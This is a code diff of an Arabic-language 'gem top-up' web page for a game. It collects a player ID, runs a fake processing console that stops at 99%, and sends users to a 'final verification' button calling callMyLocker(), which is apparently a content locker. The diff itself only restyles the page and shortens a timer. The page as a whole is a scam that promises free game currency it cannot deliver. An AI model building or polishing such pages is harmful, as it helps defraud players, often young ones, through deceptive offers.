@@ -18,11 +18,11 @@ var sc_security="cb6f73f3";
 
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>💎 💎</title>
+<title>💎 شحن الجواهر 💎</title>
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
 
 <style>
-:root { --primary:#ffcc00; --dark:#0f172a; --success:#22c55e; }
+:root { --primary:#ffcc00; --dark:#0f172a; --success:#ffcc00; }
 *{box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
 
 body {
@@ -31,11 +31,13 @@ body {
     display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden;
 }
 
+/* الإطار الأصفر المضيء للمربع الرئيسي */
 .main-container {
     width: 92%; max-width: 420px; background: rgba(30, 41, 59, 0.6);
     backdrop-filter: blur(12px); border-radius: 24px; padding: 35px 20px;
-    border: 1px solid rgba(255, 204, 0, 0.2); text-align: center;
-    box-shadow: 0 20px 50px rgba(0,0,0,0.6);
+    border: 2px solid var(--primary); /* إطار أصفر */
+    text-align: center;
+    box-shadow: 0 0 20px rgba(255, 204, 0, 0.3); /* توهج أصفر */
 }
 
 h2 { color: var(--primary); font-weight: 900; font-size: 1.5rem; margin-bottom: 20px; }
@@ -52,7 +54,6 @@ h2 { color: var(--primary); font-weight: 900; font-size: 1.5rem; margin-bottom: 
 
 .error-msg { color: #ff4b2b; font-size: 13px; margin-bottom: 15px; display: none; font-weight: bold; line-height: 1.4; }
 
-/* أيقونات الأنظمة */
 .platform-grid { display: flex; justify-content: center; gap: 15px; margin: 20px 0; }
 .platform-item {
     background: #1e293b; padding: 15px; border-radius: 15px; border: 2px solid #334155;
@@ -73,9 +74,15 @@ h2 { color: var(--primary); font-weight: 900; font-size: 1.5rem; margin-bottom: 
     color: #000; border: none; padding: 18px; width: 100%;
     border-radius: 15px; font-weight: 900; font-size: 18px;
     cursor: pointer; box-shadow: 0 5px 0 #b79500;
+    transition: 0.2s;
 }
+.btn-main:active { transform: translateY(3px); box-shadow: 0 2px 0 #b79500; }
 
-.console { background: #000; color: #22c55e; font-family: monospace; padding: 12px; border-radius: 12px; font-size: 12px; text-align: left; direction: ltr; width: 100%; height: 100px; overflow: hidden; margin-top: 15px; }
+.console { background: #000; color: #22c55e; font-family: monospace; padding: 12px; border-radius: 12px; font-size: 12px; text-align: left; direction: ltr; width: 100%; height: 100px; overflow: hidden; margin-top: 15px; border: 1px solid #334155; }
+
+/* تنسيق المرحلة الأخيرة باللون الأصفر */
+#status-text { color: var(--primary); text-shadow: 0 0 10px rgba(255, 204, 0, 0.5); }
+#final-msg { color: var(--primary); font-weight: bold; font-size: 15px; margin-bottom: 20px; line-height: 1.6; }
 
 </style>
 </head>
@@ -85,7 +92,6 @@ h2 { color: var(--primary); font-weight: 900; font-size: 1.5rem; margin-bottom: 
 <div class="main-container">
     <div id="step1" class="step-card active">
         <h2>شحن الجواهر المباشر</h2>
-        
         <input type="text" id="id-player" class="input-box" placeholder="أدخل معرف اللاعب (ID)" inputmode="numeric">
         <div id="id-error" class="error-msg">⚠️ خطأ يرجى إدخال ID صحيح</div>
 
@@ -100,7 +106,6 @@ h2 { color: var(--primary); font-weight: 900; font-size: 1.5rem; margin-bottom: 
                 <svg viewBox="0 0 24 24"><path d="M20 18c1.1 0 1.99-.9 1.99-2L22 6c0-1.1-.9-2-2-2H4c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2H0v2h24v-2h-4zM4 6h16v10H4V6z"/></svg>
             </div>
         </div>
-
         <button class="btn-main" onclick="validateID()">تحقق من الحساب</button>
     </div>
 
@@ -120,8 +125,8 @@ h2 { color: var(--primary); font-weight: 900; font-size: 1.5rem; margin-bottom: 
         <h2 id="status-text">جاري المعالجة...</h2>
         <div class="console" id="console"></div>
         <div id="verify-box" style="display:none;margin-top:20px;width:100%;">
-            <p style="color:var(--success); font-weight:bold; font-size:14px; margin-bottom:15px;">✅ تم التحقق من الحساب:  بنجاح أكمل الخطوة الأخيرة لإرسال الجواهر.: <span id="user-display" style="color:#fff"></span></p>
-            <button class="btn-main" style="background:var(--success); color:#fff;" onclick="callMyLocker()">اضغط للتحقق الأخير</button>
+            <p id="final-msg">✅ تم التحقق من الحساب: <span id="user-display" style="color:#fff"></span> بنجاح أكمل الخطوة الأخيرة لإرسال الجواهر.</p>
+            <button class="btn-main" onclick="callMyLocker()">اضغط للتحقق الأخير</button>
         </div>
     </div>
 </div>
@@ -144,8 +149,6 @@ function selectGem(x){
 function validateID(){
     const val=document.getElementById('id-player').value.trim();
     const err=document.getElementById('id-error');
-    
-    // شرط التحقق: أرقام فقط، والطول من 7 إلى 11
     const idPattern = /^\d{7,11}$/;
 
     if(idPattern.test(val)){
@@ -154,7 +157,6 @@ function validateID(){
         next(2);
     } else {
         err.style.display='block';
-        // تركيز بسيط لهز الصندوق للتنبيه
         document.getElementById('id-player').style.borderColor = "#ff4b2b";
     }
 }
@@ -182,7 +184,7 @@ function startProcess(){
             document.getElementById('verify-box').style.display='block';
             document.getElementById('status-text').innerText="اكتمال العملية 99%";
         }
-    }, 1200);
+    }, 1000);
 }
 
 function callMyLocker(){
